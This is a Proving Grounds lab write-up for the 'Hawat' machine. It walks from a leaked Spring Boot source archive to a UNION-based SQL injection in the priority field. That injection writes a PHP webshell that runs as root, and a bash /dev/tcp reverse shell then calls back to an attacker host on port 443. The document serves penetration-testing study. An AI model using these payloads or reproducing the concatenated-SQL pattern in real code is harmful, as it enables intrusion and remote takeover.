---
title: "PG Practice: Hawat"
created: "2026-04-12"
updated: "2026-04-12"
type: ctf-writeup
platform: Proving Grounds Practice
machine: "Hawat"
os: Linux
status: rooted
tags:
  - proving-grounds
  - pg-practice
  - linux
  - ctf
  - oscp
  - sql-injection
  - union-select
  - file-write
  - webshell
  - java-spring-boot
  - source-code-review
related:
  - "[[SQLi-to-RCE-Attack-Chains]]"
  - "[[Searchsploit-and-CVE-Workflow]]"
  - "[[Web-Directory-Enumeration]]"
  - "[[Reverse-Shell-Reference]]"
  - "[[Nmap-Enumeration-Methodology]]"
---

# PG Practice: Hawat

> **Platform:** Proving Grounds Practice | **OS:** Linux | **Date:** 2023-10-16

---

## Quick Summary

**Open Ports:**
- 22/tcp (ssh)
- 17445/tcp (http) — Java Spring Boot issue tracker
- 30455/tcp (http) — nginx
- 50080/tcp (http) — Apache (NextCloud)

**Key Techniques:**
- Source code review of Java Spring Boot app (downloaded from NextCloud)
- SQL injection via unsanitized `priority` parameter
- UNION SELECT INTO OUTFILE → write PHP webshell to nginx web root
- Access webshell via port 30455 → RCE as root (no privesc needed)

**Privilege Escalation Path:**
- N/A — web shell executes directly as root (uid=0)

---

## Full Walkthrough

## Nmap

```sh
PORT      STATE SERVICE VERSION
22/tcp    open  ssh
17445/tcp open  http    Java Spring Boot issue tracker
30455/tcp open  http    nginx
50080/tcp open  http    Apache httpd (NextCloud instance)
```

## Service Enumeration

**Port 50080 — NextCloud:**
- Public NextCloud instance accessible without auth
- Contains downloadable `issuetracker.zip` — source code for the app on port 17445

**Port 17445 — Issue Tracker:**
- Java Spring Boot application
- Issue tracker with priority field

## Source Code Review

Downloaded and extracted `issuetracker.zip`. Java source reveals the `priority` parameter is passed unsanitized into a SQL query:

```java
// Vulnerable code pattern (from source review):
// priority parameter directly concatenated into SQL — no prepared statement
String query = "SELECT * FROM issues WHERE priority='" + priority + "'";
```

This allows UNION-based SQL injection.

## SQL Injection → Webshell

**Step 1 — Confirm injection via UNION SELECT:**
```sh
# Test injection point via the priority parameter
# UNION SELECT to enumerate columns, then write file
```

**Step 2 — Write PHP webshell to nginx web root:**
```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>",2,3,4
  INTO OUTFILE '/srv/http/rce.php' -- -
```

**Step 3 — Access webshell via nginx (port 30455):**
```sh
curl "http://TARGET:30455/rce.php?cmd=id"
# → uid=0(root) gid=0(root)
```

Web process runs as root — no privilege escalation required.

## Reverse Shell

Port 443 was the only outbound port allowed for reverse shell callback:

```sh
# Listener on Kali:
nc -lvnp 443

# Trigger via webshell:
curl "http://TARGET:30455/rce.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/KALI_IP/443+0>%261'"
# → root shell
```

---

## Technique Links

- [[SQLi-to-RCE-Attack-Chains]]
- [[Searchsploit-and-CVE-Workflow]]
- [[Web-Directory-Enumeration]]
- [[Reverse-Shell-Reference]]
- [[Proving-Grounds-Master-Index]]
